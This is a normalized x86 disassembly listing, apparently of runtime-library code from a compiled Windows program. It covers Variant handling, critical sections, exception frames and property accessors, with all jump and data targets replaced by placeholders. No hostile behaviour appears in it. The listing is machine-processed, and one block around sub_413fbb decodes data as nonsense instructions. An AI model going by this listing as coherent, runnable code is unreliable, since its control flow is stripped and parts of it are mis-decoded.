mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ed58
retn
call sub_40e4cc
call sub_40e5bc
mov ax [ ebx ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
jmp r-xdata
lea eax [ ebp - 0x28 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_413a71
push [ fs : eax ]
mov [ fs : eax ] esp
movzx ecx [ ebp - 0xc ]
mov edx ebx
lea eax [ ebp - 0x28 ]
call sub_40f34c
mov ax [ ebp - 0x28 ]
cmp ax [ ebp - 0xc ]
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
lea edx [ ebp - 0x28 ]
mov eax [ ebp - 0x18 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
and eax 0x7f
mov edx [ ebp - 0x8 ]
lea edx [ edx * 2 + rw-data ]
mov al [ edx + eax - 0x1c ]
mov [ ebp - 0x9 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x28 ]
call sub_40ed58
retn
call sub_40e4cc
sub_413ab0
push esi
push edi
mov si [ eax ]
mov di [ edx ]
cmp si 0x10f
jae r-xdata
cmp si 0x400c
jne r-xdata
cmp di 0x10f
jae r-xdata
cmp di 0x400c
jne r-xdata
mov eax [ eax + 0x8 ]
call sub_413ab0
jmp r-xdata
call sub_413504
pop edi
pop esi
retn
and si 0xfff
cmp si 0x10f
jae r-xdata
mov edx [ edx + 0x8 ]
call sub_413ab0
jmp r-xdata
pop edi
pop esi
retn
call sub_413690
and di 0xfff
cmp di 0x10f
jae r-xdata
call sub_413504
jmp r-xdata
sub_413c9c
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_413dc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_40405c
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_41426c
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_40405c
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404314
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_408144
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_404314
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4031e0
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402864
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_40426c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_413dc9
lea eax [ ebp - 0x208 ]
call sub_404008
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_404314
sub_413e20
push ebx
push esi
push edi
add esp 0xffffffec
mov ebx eax
mov eax ebx
call sub_413e10
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov bx [ esp + 0x4 ]
cmp bx 0x10f
jae r-xdata
mov edx esp
mov eax ebx
call sub_41426c
test al al
je r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
xor eax eax
lea edx [ esp + 0x4 ]
mov eax [ esp ]
mov ecx [ eax ]
call [ ecx + 0x14 ]
jmp r-xdata
mov al 0x1
jmp r-xdata
mov ax [ esp + 0x4 ]
cmp ax 0x9
je r-xdata
add esp 0x14
pop edi
pop esi
pop ebx
retn
cmp [ esp + 0xc ] 0x0
je r-xdata
cmp ax 0xd
jne r-xdata
xor eax eax
jmp r-xdata
sub_413e94
push ebx
push esi
push edi
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov eax ebx
call sub_413e10
push esi
mov esi eax
lea edi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov eax esi
call sub_413e10
push esi
mov esi eax
lea edi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov ax [ esp ]
test ax ax
jne r-xdata
cmp ax 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
sete al
jmp r-xdata
mov ax [ esp + 0x10 ]
sub ax 0x2
jae r-xdata
cmp [ esp + 0x10 ] 0x1
sete al
jmp r-xdata
add esp 0x20
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx esi
call sub_414414
sete al
xor eax eax
jmp r-xdata
sub_413f30
push ebx
mov bx [ eax ]
cmp bx 0x400c
jne r-xdata
mov [ edx ] bx
test [ edx + 0x1 ] 0x20
setne bl
test bl bl
je r-xdata
mov eax [ eax + 0x8 ]
call sub_413f30
mov ebx eax
jmp r-xdata
xor eax eax
mov [ ecx ] eax
test [ edx + 0x1 ] 0x40
je r-xdata
mov eax ebx
pop ebx
retn
mov eax [ eax + 0x8 ]
mov [ ecx ] eax
jmp r-xdata
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ecx ] eax
jmp r-xdata
sub_413f7c
add esp 0xfffffff8
test dl dl
je r-xdata
mov ax [ eax ]
and ax 0x2000
cmp ax 0x2000
sete al
pop ecx
pop edx
retn
lea ecx [ esp + 0x4 ]
mov edx esp
call sub_413f30
pop ecx
pop edx
retn
sub_413fbb
inc eax
add [ eax ] cl
push esi
popad
jb r-xdata
stc
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_41426c
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_4141ec
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_413fc8
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_414029
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_405000
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414030
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_403290
sub_414078
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_4141ec
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_41426c
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4140cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_414104
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_4141ec
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_414140
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403644
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_4141a3
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4141aa
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_414244
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403344
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_41426c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_414314
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_405000
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_414324
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4143fa
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4143dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_405008
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4143e4
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_4031e0
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_40426c
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407e64
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_414424
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_414493
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41449a
retn
call sub_413fc8
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_4051c8
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404a84
mov eax rw-data
call sub_404008
mov eax rw-data
call sub_40ed6c
sub_41449c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_41453d
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414544
retn
mov eax rw-data
call sub_413f24
mov eax sub_40ea6c
mov [ rw-data ] eax
mov eax sub_40e5bc
mov [ rw-data ] eax
mov edx sub_40e4cc
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40ed6c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_413b18
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f080
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412070
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_412798
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_4146a8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414766
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ esi ] 0x1
jne r-xdata
mov eax esi
call sub_41469c
mov eax [ eax + 0x9 ]
mov eax [ eax ]
call sub_41469c
cmp esi [ r-xdata ]
je r-xdata
mov edx edi
mov eax ebx
call sub_408030
jmp r-xdata
mov eax edi
test ebx ebx
setne dl
and edx 0x7f
mov edx [ edx * 4 + rw-data ]
call sub_40405c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx r-xdata
call sub_407e64
test al al
je r-xdata
cmp [ eax + 0x1 ] 0x0
jge r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41476d
lea eax [ ebp - 0x4 ]
call sub_404008
retn
lea edx [ ebp - 0x4 ]
mov eax [ edi ]
call sub_407d84
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_40405c
jmp r-xdata
lea esi [ eax + 0xd ]
test ebx ebx
je r-xdata
mov eax edi
mov edx esi
call sub_40426c
xor eax eax
mov al [ esi ]
inc eax
add esi eax
dec ebx
test ebx ebx
jne r-xdata
sub_414780
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4147cc
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_41469c
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_40816c
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414780
mov edx [ rw-data ]
mov eax esi
call sub_407e64
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407e64
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_40816c
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_414830
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_4148a0
push ebx
push esi
push edi
xor ecx ecx
mov esi eax
mov cl [ eax + 0x1 ]
mov edi edx
xor eax eax
movzx ecx [ esi + ecx + 0xa ]
[ edi ]
mov esi [ esi + 0x4 ]
xor ecx ecx
test esi esi
je r-xdata
lea edi [ esi + ecx + 0xd ]
pop edi
pop esi
pop ebx
retn
mov esi [ esi ]
jmp r-xdata
lea edi [ edi + ecx + 0x1b ]
dec eax
jne r-xdata
mov [ edx + ebx * 4 ] edi
mov cl [ esi + 0x1 ]
lea esi [ esi + ecx + 0x2 ]
mov cl [ esi + 0xa ]
movzx eax [ esi + ecx + 0xb ]
test eax eax
je r-xdata
movzx ebx [ edi + 0x18 ]
mov cl [ edi + 0x1a ]
cmp [ edx + ebx * 4 ] 0x0
jne r-xdata
sub_4148f4
mov ecx [ edx + 0xc ]
test ecx 0xffffff00
je r-xdata
mov al cl
retn
cmp [ edx + 0xf ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
call ecx
retn
ja r-xdata
and ecx 0xffffff
mov cl [ ecx + eax ]
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_414924
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
cmp [ edx + 0x7 ] 0xfe
mov edx [ edx + 0x10 ]
jb r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
mov bl [ edi + ecx + 0x2 ]
call ecx
jmp r-xdata
ja r-xdata
cmp bl 0x4
jae r-xdata
and ecx 0xffffff
add ecx eax
mov al [ ecx ]
cmp bl 0x2
jb r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop edi
pop ebx
retn
cmp bl 0x2
jae r-xdata
mov ax [ ecx ]
cmp bl 0x4
jb r-xdata
movsx eax ax
je r-xdata
cmp bl 0x0
movsx eax al
je r-xdata
mov eax [ ecx ]
and eax 0xffff
and eax 0xff
pop edi
pop ebx
retn
sub_414998
push ebx
push esi
push edi
mov edi edx
mov esi [ edi ]
mov esi [ esi ]
mov bl 0x4
cmp [ esi ] 0x7
je r-xdata
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
xor ebx ebx
mov bl [ esi + 0x1 ]
mov bl [ esi + ebx + 0x2 ]
mov esi [ edi + 0x8 ]
cmp [ edi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add eax esi
mov [ eax ] cl
cmp bl 0x2
jb r-xdata
jb r-xdata
pop edi
pop esi
pop ebx
retn
mov [ eax ] cx
cmp bl 0x4
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
mov [ eax ] ecx
sub_4149f4
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
add esi eax
mov edi ecx
xor ecx ecx
mov cl [ esi ]
inc ecx
[ edi ] [ esi ]
jb r-xdata
call esi
jmp r-xdata
movsx esi si
add esi [ eax ]
call [ esi ]
jmp r-xdata
pop edi
pop esi
pop ebp
retn 0x4
sub_414a38
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add edi eax
mov eax [ esi ]
mov eax [ eax ]
mov esi ecx
xor ecx ecx
mov cl [ eax + 0x1 ]
mov cl [ eax + ecx + 0x2 ]
lodsb [ esi ]
cmp al cl
jb r-xdata
jb r-xdata
stosb [ edi ]
mov cl al
[ edi ] [ esi ]
pop edi
pop esi
retn
mov al cl
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414ab4
push ebx
push esi
push edi
add esp 0xffffff00
mov edi ecx
mov esi edx
mov ebx eax
mov eax esp
mov edx edi
mov ecx 0xff
call sub_4042a4
mov ecx esp
mov edx esi
mov eax ebx
call sub_414a38
add esp 0x100
pop edi
pop esi
pop ebx
retn
sub_414afc
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
mov edx [ esi + eax ]
mov eax ecx
call sub_414ae8
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_414b3c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_414ae8
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_414b7c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414bc4
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414c98
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_404290
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414bcb
lea eax [ ebp - 0x4 ]
call sub_4046e8
retn
sub_414bd4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_414c1c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx edi
call sub_404834
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_414d80
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414c23
lea eax [ ebp - 0x4 ]
call sub_4046e8
retn
sub_414c2c
push ebx
mov ebx ecx
mov ecx [ edx ]
mov ecx [ ecx ]
mov cl [ ecx ]
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414a8c
pop ebx
retn
sub cl 0x5
je r-xdata
mov ecx ebx
call sub_414afc
pop ebx
retn
dec cl
je r-xdata
mov ecx ebx
call sub_414b7c
pop ebx
retn
jmp r-xdata
mov eax ebx
call sub_404008
pop ebx
retn
sub_414c6c
push ebx
mov ebx [ edx ]
mov ebx [ ebx ]
mov bl [ ebx ]
sub bl 0x5
je r-xdata
call sub_414ab4
pop ebx
retn
sub bl 0x5
je r-xdata
call sub_414b3c
pop ebx
retn
dec bl
je r-xdata
call sub_414bd4
jmp r-xdata
pop ebx
retn
sub_414c98
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414d70
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_414c2c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_404834
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414d77
lea eax [ ebp - 0x10 ]
call sub_404008
retn
dec al
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax [ ebp - 0x4 ]
mov edx [ ebx ]
call sub_404724
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4046e8
mov [ ebp - 0xc ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov [ ebp - 0x8 ] esi
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_414d80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_414e46
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
mov al [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404290
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_414c6c
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_414e4d
lea eax [ ebp - 0xc ]
call sub_404008
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_404724
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_414e54
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_41469c
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_414e94 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_41469c
cmp [ eax ] 0x4
jne r-xdata
sub_414f6c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_41469c
mov al [ eax ]
mov edx ebx
and edx 0xff000000
